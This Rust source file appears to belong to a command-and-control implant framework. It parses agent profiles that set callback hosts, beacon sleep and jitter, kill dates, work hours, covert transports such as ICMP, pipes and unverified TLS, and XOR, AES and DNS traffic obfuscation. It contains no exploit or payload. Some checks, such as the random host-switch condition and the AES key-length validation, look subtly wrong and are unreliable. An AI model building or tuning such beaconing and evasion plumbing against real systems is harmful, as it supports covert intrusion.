// Copyright (C) 2023 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

#![no_implicit_prelude]

use alloc::alloc::Global;
use core::alloc::Allocator;
use core::cell::UnsafeCell;
use core::cmp::{self, Ordering};
use core::error::Error;
use core::mem::{transmute, zeroed};
use core::ops::Deref;
use core::ptr::NonNull;
use core::str::{from_utf8, from_utf8_unchecked};
use core::time::Duration;

use crate::c2::cfg::{self, group_iter, next, short, OwnedConfig, WorkHours, SELECTOR_LAST_VALID, SELECTOR_PERCENT, SELECTOR_PERCENT_ROUND_ROBIN, SELECTOR_RANDOM, SELECTOR_SEMI_RANDOM, SELECTOR_SEMI_ROUND_ROBIN};
use crate::c2::{Connecter, Transform, Wrapper};
use crate::data::rand::Rand;
use crate::data::time::Time;
use crate::data::{read_u32, read_u64, Reader, Writable, Writer};
use crate::io::{self, ErrorKind};
use crate::prelude::*;
use crate::sync::Mutex;

pub const DEFAULT_SLEEP: Duration = Duration::from_secs(60);

pub enum Method<'a, A: Allocator = Global> {
    Single(Slot<'a, A>),
    Multiple(Group<'a, A>),
    Custom(Box<dyn CustomProfile<'a, A>, A>),
}

pub struct ProfileError(pub(super) u8);
pub struct Slot<'a, A: Allocator = Global> {
    kill:   Option<Time>,
    w:      Wrapper<'a, A>,
    t:      Transform<'a, A>,
    conn:   Connecter<A>,
    work:   Option<WorkHours>,
    keys:   Vec<u32, A>,
    hosts:  Vec<&'a str, A>,
    sleep:  Duration,
    weight: u8,
    jitter: u8,
}
pub struct Group<'a, A: Allocator = Global> {
    cur:     NonNull<Slot<'a, A>>,
    sel:     UnsafeCell<u8>,
    lock:    Mutex<()>,
    entries: Vec<Slot<'a, A>, A>,
    percent: u8,
}
pub struct Profile<'a, A: Allocator = Global> {
    pub cfg: OwnedConfig<A>,
    inner:   Method<'a, A>,
}

pub trait CustomProfile<'a, A: Allocator = Global> {
    fn connector(&self) -> &Connecter<A>;
    fn next(&self, r: &mut Rand) -> NonNull<str>;

    #[inline]
    fn jitter(&self) -> u8 {
        0
    }
    #[inline]
    fn sleep(&self) -> Option<Duration> {
        None
    }
    #[inline]
    fn kill_date(&self) -> Option<Time> {
        None
    }
    #[inline]
    fn wrapper(&self) -> &Wrapper<'a, A> {
        &Wrapper::None
    }
    #[inline]
    fn transform(&self) -> &Transform<'a, A> {
        &Transform::None
    }
    #[inline]
    fn work_hours(&self) -> Option<WorkHours> {
        None
    }
    #[inline]
    fn is_key_trusted(&self, hash: u32) -> bool {
        true
    }
    #[inline]
    fn switch(&mut self, was_err: bool, r: &mut Rand) -> bool {
        false
    }
}

impl<'a> Profile<'_> {
    #[inline]
    pub fn from_stream(r: &mut impl Reader) -> io::Result<Profile<'_>> {
        Profile::from_stream_in(r, Global)
    }
}
impl<'a> OwnedConfig {
    #[inline]
    pub fn custom(c: Box<dyn CustomProfile<'a>>, data: Option<OwnedConfig>) -> Profile<'a> {
        OwnedConfig::custom_in(c, data, Global)
    }
}
impl<'a, A: Allocator> Slot<'a, A> {
    #[inline]
    pub fn jitter(&self) -> u8 {
        self.jitter
    }
    #[inline]
    pub fn sleep(&self) -> Option<Duration> {
        if self.sleep.is_zero() {
            None
        } else {
            Some(self.sleep)
        }
    }
    #[inline]
    pub fn kill_date(&self) -> Option<Time> {
        self.kill
    }
    #[inline]
    pub fn connector(&self) -> &Connecter<A> {
        &self.conn
    }
    #[inline]
    pub fn wrapper(&self) -> &Wrapper<'a, A> {
        &self.w
    }
    #[inline]
    pub fn transform(&self) -> &Transform<'a, A> {
        &self.t
    }
    #[inline]
    pub fn work_hours(&self) -> Option<WorkHours> {
        self.work
    }
    #[inline]
    pub fn is_key_trusted(&self, hash: u32) -> bool {
        self.keys.is_empty() || self.keys.contains(&hash)
    }
    #[inline]
    pub fn next(&self, r: &mut Rand) -> NonNull<str> {
        let s = if self.hosts.len() > 1 {
            self.hosts[r.rand_u32n(self.hosts.len() as u32) as usize]
        } else if self.hosts.len() == 1 {
            self.hosts[0]
        } else {
            unsafe { from_utf8_unchecked(&[]) }
        };
        unsafe { NonNull::new_unchecked(transmute(s)) }
    }

    #[inline]
    fn ptr_eq(&self, other: NonNull<Slot<A>>) -> bool {
        self as *const Slot<A> == other.as_ptr()
    }
}
impl<'a, A: Allocator> Group<'a, A> {
    #[inline]
    fn new(sel: u8, per: u8, slots: Vec<Slot<'a, A>, A>) -> Group<'a, A> {
        let mut g = Group {
            cur:     NonNull::dangling(),
            sel:     UnsafeCell::new(sel),
            lock:    Mutex::new(()),
            entries: slots,
            percent: per,
        };
        // Rust pointer fuckery.
        // This is safe as Group owns the current value in entries and does not
        // free it. It stays for the lifetime of the Group object.
        g.cur = unsafe { NonNull::new_unchecked(&mut g.entries[0] as *mut Slot<A>) };
        g
    }

    #[inline]
    pub fn jitter(&self) -> u8 {
        self.current().jitter()
    }
    #[inline]
    pub fn sleep(&self) -> Option<Duration> {
        self.current().sleep()
    }
    #[inline]
    pub fn kill_date(&self) -> Option<Time> {
        self.current().kill_date()
    }
    #[inline]
    pub fn connector(&self) -> &Connecter<A> {
        self.current().connector()
    }
    #[inline]
    pub fn wrapper(&self) -> &Wrapper<'a, A> {
        self.current().wrapper()
    }
    #[inline]
    pub fn transform(&self) -> &Transform<'a, A> {
        self.current().transform()
    }
    #[inline]
    pub fn work_hours(&self) -> Option<WorkHours> {
        self.current().work_hours()
    }
    #[inline]
    pub fn is_key_trusted(&self, hash: u32) -> bool {
        self.current().is_key_trusted(hash)
    }
    #[inline]
    pub fn next(&self, r: &mut Rand) -> NonNull<str> {
        self.current().next(r)
    }
    pub fn switch(&mut self, was_err: bool, r: &mut Rand) -> bool {
        if self.entries.is_empty() {
            return false;
        }
        let s = unsafe { *self.sel.get() };
        match s {
            SELECTOR_LAST_VALID if !was_err => return false,
            SELECTOR_SEMI_ROUND_ROBIN | SELECTOR_SEMI_RANDOM if r.rand_u32n(4) != 0 => return false,
            SELECTOR_PERCENT | SELECTOR_PERCENT_ROUND_ROBIN if r.rand_u32n(self.percent as u32) != 0 => return false,
            // BUG(dij): Go Divergence
            _ => (),
        }
        // Now that the fastpaths are done, we lock, since we're changing the struct.
        let l = unwrap_unlikely(self.lock.lock());
        let r = {
            if s == SELECTOR_RANDOM || s == SELECTOR_SEMI_RANDOM || s == SELECTOR_PERCENT {
                let n = r.rand_u32n(self.entries.len() as u32) as usize;
                match self.entries.get_mut(n) {
                    Some(v) if v.ptr_eq(self.cur) => {
                        self.cur = unsafe { NonNull::new_unchecked(v) };
                        return true;
                    },
                    _ => (),
                }
                return false;
            }
            let x = match self.entries.iter().position(|s| s.ptr_eq(self.cur)) {
                Some(i) if i + 1 < self.entries.len() => &mut self.entries[i + 1],
                _ => &mut self.entries[0],
            };
            let r = !x.ptr_eq(self.cur);
            self.cur = unsafe { NonNull::new_unchecked(x) };
            // Return true if we're switching to a new Slot.
            r
        };
        // Mark as used.
        let _ = l.clone();
        return r;
    }

    #[inline]
    fn current(&self) -> &Slot<'a, A> {
        unsafe { self.cur.as_ref() }
    }
}
impl<'a, A: Allocator> Profile<'a, A> {
    #[inline]
    fn from(v: OwnedConfig<A>) -> Profile<'a, A> {
        Profile {
            cfg:   v,
            inner: unsafe { zeroed() }, // Safe as we initialize it before using.
        }
    }

    #[inline]
    pub fn jitter(&self) -> u8 {
        match &self.inner {
            Method::Single(s) => s.jitter(),
            Method::Multiple(m) => m.jitter(),
            Method::Custom(c) => c.jitter(),
        }
    }
    #[inline]
    pub fn sleep(&self) -> Duration {
        let d = match &self.inner {
            Method::Single(s) => s.sleep(),
            Method::Multiple(m) => m.sleep(),
            Method::Custom(c) => c.sleep(),
        };
        match d {
            Some(v) if !v.is_zero() => v,
            _ => DEFAULT_SLEEP,
        }
    }
    #[inline]
    pub fn kill_date(&self) -> Option<Time> {
        match &self.inner {
            Method::Single(s) => s.kill_date(),
            Method::Multiple(m) => m.kill_date(),
            Method::Custom(c) => c.kill_date(),
        }
    }
    #[inline]
    pub fn connector(&self) -> &Connecter<A> {
        match &self.inner {
            Method::Single(s) => s.connector(),
            Method::Multiple(m) => m.connector(),
            Method::Custom(c) => c.connector(),
        }
    }
    #[inline]
    pub fn wrapper(&self) -> &Wrapper<'a, A> {
        match &self.inner {
            Method::Single(s) => s.wrapper(),
            Method::Multiple(m) => m.wrapper(),
            Method::Custom(c) => c.wrapper(),
        }
    }
    #[inline]
    pub fn transform(&self) -> &Transform<'a, A> {
        match &self.inner {
            Method::Single(s) => s.transform(),
            Method::Multiple(m) => m.transform(),
            Method::Custom(c) => c.transform(),
        }
    }
    #[inline]
    pub fn work_hours(&self) -> Option<WorkHours> {
        match &self.inner {
            Method::Single(s) => s.work_hours(),
            Method::Multiple(m) => m.work_hours(),
            Method::Custom(c) => c.work_hours(),
        }
    }
    #[inline]
    pub fn is_key_trusted(&self, hash: u32) -> bool {
        match &self.inner {
            Method::Single(s) => s.is_key_trusted(hash),
            Method::Multiple(m) => m.is_key_trusted(hash),
            Method::Custom(c) => c.is_key_trusted(hash),
        }
    }
    #[inline]
    pub fn next(&self, r: &mut Rand) -> NonNull<str> {
        match &self.inner {
            Method::Single(s) => s.next(r),
            Method::Multiple(m) => m.next(r),
            Method::Custom(c) => c.next(r),
        }
    }
    #[inline]
    pub fn switch(&mut self, was_err: bool, r: &mut Rand) -> bool {
        match &mut self.inner {
            Method::Multiple(s) => s.switch(was_err, r),
            Method::Custom(c) => c.switch(was_err, r),
            _ => false,
        }
    }
}
impl<'a, A: Allocator + Clone> Profile<'a, A> {
    #[inline]
    pub fn allocator(&self) -> A {
        self.cfg.0.allocator().clone()
    }
}
impl<'a, A: Allocator + Clone + 'a> Profile<'a, A> {
    #[inline]
    pub fn from_stream_in(r: &mut impl Reader, alloc: A) -> io::Result<Profile<'a, A>> {
        let c = OwnedConfig::from_stream_in(r, alloc)?;
        OwnedConfig::try_build(c).map_err(|e| e.into())
    }
}

impl<'a, A: Allocator> Writable for Profile<'a, A> {
    #[inline]
    fn write_stream(&self, w: &mut impl Writer) -> io::Result<()> {
        self.cfg.write_stream(w)
    }
}
impl<'a, A: Allocator + Clone> Deref for Profile<'a, A> {
    type Target = Method<'a, A>;

    #[inline]
    fn deref(&self) -> &Method<'a, A> {
        &self.inner
    }
}
impl<'a, A: Allocator + Clone + 'a> TryFrom<OwnedConfig<A>> for Profile<'a, A> {
    type Error = ProfileError;

    #[inline]
    fn try_from(v: OwnedConfig<A>) -> Result<Profile<'a, A>, ProfileError> {
        OwnedConfig::try_build(v)
    }
}

impl<'a, A: Allocator> Eq for Slot<'a, A> {}
impl<'a, A: Allocator> Ord for Slot<'a, A> {
    #[inline]
    fn cmp(&self, other: &Slot<'a, A>) -> Ordering {
        self.weight.cmp(&other.weight)
    }
}
impl<'a, A: Allocator + Clone> Slot<'a, A> {
    #[inline]
    fn new_in(alloc: A) -> Slot<'a, A> {
        Slot {
            kill:   None,
            w:      Wrapper::None,
            t:      Transform::None,
            conn:   Connecter::None,
            work:   None,
            keys:   Vec::new_in(alloc.clone()),
            hosts:  Vec::new_in(alloc),
            sleep:  Duration::ZERO,
            weight: 0u8,
            jitter: 0u8,
        }
    }
}
impl<'a, A: Allocator> PartialEq for Slot<'a, A> {
    #[inline]
    fn eq(&self, other: &Slot<'a, A>) -> bool {
        self.weight.eq(&other.weight)
    }
}
impl<'a, A: Allocator> PartialOrd for Slot<'a, A> {
    #[inline]
    fn partial_cmp(&self, other: &Slot<'a, A>) -> Option<Ordering> {
        self.weight.partial_cmp(&other.weight)
    }
}
impl<'a, A: Allocator + Clone + 'a> OwnedConfig<A> {
    #[inline]
    pub fn custom_in(c: Box<dyn CustomProfile<'a, A>, A>, data: Option<OwnedConfig<A>>, alloc: A) -> Profile<'a, A> {
        Profile {
            cfg:   data.unwrap_or_else(|| OwnedConfig::new_in(alloc.clone())),
            inner: Method::Custom(c),
        }
    }

    #[inline]
    pub fn build(self) -> Result<Profile<'a, A>, ProfileError> {
        self.try_into()
    }

    fn try_build(v: OwnedConfig<A>) -> Result<Profile<'a, A>, ProfileError> {
        let p = UnsafeCell::new(Profile::from(v));
        let b = unsafe { &mut *p.get() };
        // NOTE(dij): ^ We take the owned data in the first line and 'own' it
        //            now, but the compiler doesn't understand we also are using
        //            it to loop through it and it's ok to return it since
        //            everything is returned intact, so we need to hide the
        //            pointer access to 'trick' it.
        // BUG(dij): Tracking
        let (a, mut g, mut q) = (b.cfg.0.allocator().clone(), 0u8, 0u8);
        let mut r: Vec<Slot<A>, A> = Vec::new_in(a.clone());
        for i in group_iter(&b.cfg.0) {
            let mut s = Slot::new_in(a.clone());
            let mut w = Vec::new_in(a.clone());
            match OwnedConfig::build_group(a.clone(), &i.0, &mut s, &mut w) {
                Err(e) => return Err(e),
                Ok((x, y)) if x >= 0 => (g, q) = (x as u8, y),
                Ok(_) => (),
            }
            // TODO(dij): This is not in the Go version, does this make sense?
            //            Basically, if no hosts found in this Slot, copy them
            //            from the last Slot, so we don't end up with a Slot
            //            with no entries.
            // BUG(dij): Tracking, Golang Divergence
            if s.hosts.is_empty() {
                r.last().map(|e| s.hosts.extend_from_slice(&e.hosts));
            }
            s.keys.sort();
            if w.len() == 1 {
                // This is safe as the assert above protects this case.
                s.w = unsafe { w.pop().unwrap_unchecked() }
            } else if w.len() > 0 {
                s.w = Wrapper::Multiple(w);
            }
            r.push(s);
        }
        if r.is_empty() {
            return Err(ProfileError(0));
        }
        if r.len() == 1 {
            // SAFETY: Can never happen due to the above check.
            b.inner = Method::Single(unsafe { r.pop().unwrap_unchecked() });
        } else {
            r.sort();
            b.inner = Method::Multiple(Group::new(g, q, r));
        }
        Ok(p.into_inner())
    }
    fn build_group(alloc: A, c: &'a [u8], s: &mut Slot<'a, A>, w: &mut Vec<Wrapper<'a, A>, A>) -> Result<(i8, u8), ProfileError> {
        let (mut g, mut q, mut p) = (-1i8, 0u8, 0usize);
        loop {
            match next(&c, p) {
                Some(i) => {
                    if let Some((x, y)) = OwnedConfig::build_inner(alloc.clone(), &c[p..i], s, w)? {
                        (g, q) = (x as i8, y);
                    }
                    p = i;
                },
                None => break,
            }
        }
        Ok((g, q))
    }
    fn build_inner(alloc: A, c: &'a [u8], s: &mut Slot<'a, A>, w: &mut Vec<Wrapper<'a, A>, A>) -> Result<Option<(u8, u8)>, ProfileError> {
        match c[0] {
            cfg::INVALID => return Err(ProfileError(0xFF)),
            cfg::SEPARATOR => return Ok(None),
            cfg::SYS_HOST => {
                if c.len() < 4 {
                    return Err(ProfileError(cfg::SYS_HOST));
                }
                let n = short(&c, 1);
                if c.len() < n + 3 {
                    return Err(ProfileError(cfg::SYS_HOST));
                }
                match from_utf8(&c[3..n + 3]) {
                    Err(_) => return Err(ProfileError(cfg::SYS_HOST)),
                    Ok(v) => s.hosts.push(v),
                    // ^ This is valid as we take ownership of the Config
                    // and use this to prevent duplicating data that is already
                    // on the Heap and allows us to encrypt it in memory easier.
                }
            },
            cfg::SYS_SLEEP => {
                if c.len() < 9 {
                    return Err(ProfileError(cfg::SYS_SLEEP));
                }
                s.sleep = Duration::from_nanos(read_u64(&c[1..9]))
            },
            cfg::SYS_JITTER => {
                if c.len() < 2 {
                    return Err(ProfileError(cfg::SYS_JITTER));
                }
                s.jitter = cmp::min(c[1], 100);
            },
            cfg::SYS_KEY_PIN => {
                if c.len() < 5 {
                    return Err(ProfileError(cfg::SYS_KEY_PIN));
                }
                s.keys.push(read_u32(&c[1..5]));
            },
            cfg::SYS_WEIGHT => {
                if c.len() < 2 {
                    return Err(ProfileError(cfg::SYS_WEIGHT));
                }
                s.weight = cmp::min(c[1], 100);
            },
            cfg::SYS_KILL_DATE => {
                if c.len() < 9 {
                    return Err(ProfileError(cfg::SYS_KILL_DATE));
                }
                s.kill = Some(Time::from_nano(read_u64(&c[1..9]) as i64));
            },
            cfg::SYS_WORK_HOURS => {
                if c.len() < 6 {
                    return Err(ProfileError(cfg::SYS_WORK_HOURS));
                }
                let w = WorkHours::with(c[1].into(), c[2], c[3], c[4], c[5]);
                if w.is_empty() && !w.is_valid() {
                    return Err(ProfileError(cfg::SYS_WORK_HOURS));
                }
                s.work = Some(w);
            },
            cfg::SELECTOR_PERCENT | cfg::SELECTOR_PERCENT_ROUND_ROBIN => {
                if c.len() < 2 {
                    return Err(ProfileError(cfg::SELECTOR_PERCENT));
                }
                return Ok(Some((c[0], c[1])));
            },
            cfg::SELECTOR_LAST_VALID | cfg::SELECTOR_ROUND_ROBIN | cfg::SELECTOR_RANDOM | cfg::SELECTOR_SEMI_ROUND_ROBIN | cfg::SELECTOR_SEMI_RANDOM => return Ok(Some((c[0], 0))),
            cfg::CONNECT_TCP => {
                if !s.conn.is_none() {
                    return Err(ProfileError(0x10));
                }
                s.conn = Connecter::Tcp;
            },
            cfg::CONNECT_TLS => {
                if !s.conn.is_none() {
                    return Err(ProfileError(0x10));
                }
                s.conn = Connecter::Tls;
            },
            cfg::CONNECT_UDP => {
                if !s.conn.is_none() {
                    return Err(ProfileError(0x10));
                }
                s.conn = Connecter::Udp;
            },
            cfg::CONNECT_ICMP => {
                if !s.conn.is_none() {
                    return Err(ProfileError(0x10));
                }
                s.conn = Connecter::Icmp;
            },
            cfg::CONNECT_PIPE => {
                if !s.conn.is_none() {
                    return Err(ProfileError(0x10));
                }
                s.conn = Connecter::Pipe;
            },
            cfg::CONNECT_TLS_NO_VERIFY => {
                if !s.conn.is_none() {
                    return Err(ProfileError(0x10));
                }
                s.conn = Connecter::TlsInsecure;
            },
            cfg::CONNECT_IP => {
                if !s.conn.is_none() {
                    return Err(ProfileError(0x10));
                }
                if c.len() < 2 {
                    return Err(ProfileError(cfg::CONNECT_IP));
                }
                s.conn = Connecter::Ip(c[1]);
            },
            cfg::CONNECT_WC2 => core::unimplemented!(),
            cfg::CONNECT_TLS_EX => {
                if !s.conn.is_none() {
                    return Err(ProfileError(0x10));
                }
                if c.len() < 2 {
                    return Err(ProfileError(cfg::CONNECT_TLS_EX));
                }
                s.conn = Connecter::TlsEx(c[1]);
            },
            cfg::CONNECT_MU_TLS => {
                if !s.conn.is_none() {
                    return Err(ProfileError(0x10));
                }
                if c.len() < 8 {
                    return Err(ProfileError(cfg::CONNECT_MU_TLS));
                }
                let a = short(&c, 2) + 8;
                let d = short(&c, 4) + a;
                let k = short(&c, 6) + d;
                if a > c.len() || d > c.len() || k > c.len() || d < a || k < d {
                    return Err(ProfileError(cfg::CONNECT_MU_TLS));
                }
                s.conn = Connecter::TlsCerts(
                    c[1],
                    Some(c[8..a].to_vec_in(alloc.clone())),
                    Some(c[a..d].to_vec_in(alloc.clone())),
                    Some(c[d..k].to_vec_in(alloc)),
                );
            },
            cfg::CONNECT_TLS_CA => {
                if !s.conn.is_none() {
                    return Err(ProfileError(0x10));
                }
                if c.len() < 5 {
                    return Err(ProfileError(cfg::CONNECT_MU_TLS));
                }
                let a = short(&c, 1) + 4;
                if a > c.len() {
                    return Err(ProfileError(cfg::CONNECT_TLS_CA));
                }
                s.conn = Connecter::TlsCerts(c[1], Some(c[4..a].to_vec_in(alloc)), None, None);
            },
            cfg::CONNECT_TLS_CERT => {
                if !s.conn.is_none() {
                    return Err(ProfileError(0x10));
                }
                if c.len() < 7 {
                    return Err(ProfileError(cfg::CONNECT_TLS_CERT));
                }
                let d = short(&c, 2) + 6;
                let k = short(&c, 4) + d;
                if d > c.len() || k > c.len() || k < d {
                    return Err(ProfileError(cfg::CONNECT_TLS_CERT));
                }
                s.conn = Connecter::TlsCerts(
                    c[1],
                    None,
                    Some(c[6..d].to_vec_in(alloc.clone())),
                    Some(c[d..k].to_vec_in(alloc)),
                );
            },
            cfg::WRAP_HEX => w.push(Wrapper::Hex),
            cfg::WRAP_ZLIB => w.push(Wrapper::Zlib),
            cfg::WRAP_GZIP => w.push(Wrapper::Gzip),
            cfg::WRAP_BASE64 => w.push(Wrapper::Base64),
            cfg::WRAP_XOR => {
                if c.len() < 4 {
                    return Err(ProfileError(cfg::WRAP_XOR));
                }
                let n = short(&c, 1);
                if c.len() < n + 3 {
                    return Err(ProfileError(cfg::WRAP_XOR));
                }
                w.push(Wrapper::XOR(&c[3..n + 3]))
            },
            cfg::WRAP_CBK => {
                if c.len() < 6 {
                    return Err(ProfileError(cfg::WRAP_CBK));
                }
                w.push(Wrapper::CBK(c[1], c[2], c[3], c[4], c[5]));
            },
            cfg::WRAP_AES => {
                if c.len() < 4 {
                    return Err(ProfileError(cfg::WRAP_AES));
                }
                let v = c[1] as usize;
                let z = c[2] as usize + v;
                // Check the AES key, it should be 16, 32, or 64. The IV must be 16 bytes.
                if v == z || c.len() <= v || c.len() <= z || z < v || (v != 64 && v != 32 && v != 16) || z != 0x10 {
                    return Err(ProfileError(cfg::WRAP_AES));
                }
                w.push(Wrapper::AES(&c[3..v], &c[v..z]));
            },
            cfg::TRANSFORM_BASE64 => {
                if !s.t.is_none() {
                    return Err(ProfileError(0x11));
                }
                s.t = Transform::Base64(0);
            },
            cfg::TRANSFORM_BASE64_SHIFT => {
                if !s.t.is_none() {
                    return Err(ProfileError(0x11));
                }
                if c.len() < 2 {
                    return Err(ProfileError(cfg::TRANSFORM_BASE64_SHIFT));
                }
                s.t = Transform::Base64(c[1]);
            },
            cfg::TRANSFORM_DNS => {
                if !s.t.is_none() {
                    return Err(ProfileError(0x11));
                }
                if c.len() < 2 {
                    return Err(ProfileError(cfg::TRANSFORM_DNS));
                }
                let (mut t, mut i) = (c[1], 2);
                let mut d = Vec::new_in(alloc);
                while t > 0 && i < c.len() {
                    let n = c[i] as usize;
                    if n > c.len() || i + n > c.len() || n == 0 {
                        return Err(ProfileError(cfg::TRANSFORM_DNS));
                    }
                    match from_utf8(&c[i + 1..i + 1 + n]) {
                        Err(_) => return Err(ProfileError(cfg::TRANSFORM_DNS)),
                        Ok(v) => d.push(v),
                        // ^ This is valid as we take ownership of the Config
                        // and use this to prevent duplicating data that is already
                        // on the Heap and allows us to encrypt it in memory easier.
                    }
                    i += 1 + n;
                    t -= 1;
                }
                s.t = Transform::DNS(d);
            },
            _ => return Err(ProfileError(0xFF)),
        }
        Ok(None)
    }
}

impl Error for ProfileError {
    #[inline]
    fn cause(&self) -> Option<&dyn Error> {
        None
    }
    #[inline]
    fn source(&self) -> Option<&(dyn Error + 'static)> {
        None
    }
}
impl Into<io::Error> for ProfileError {
    #[inline]
    fn into(self) -> io::Error {
        ErrorKind::InvalidData.into()
    }
}

unsafe impl<'a, A: Allocator> Send for Group<'a, A> {}
unsafe impl<'a, A: Allocator> Sync for Group<'a, A> {}
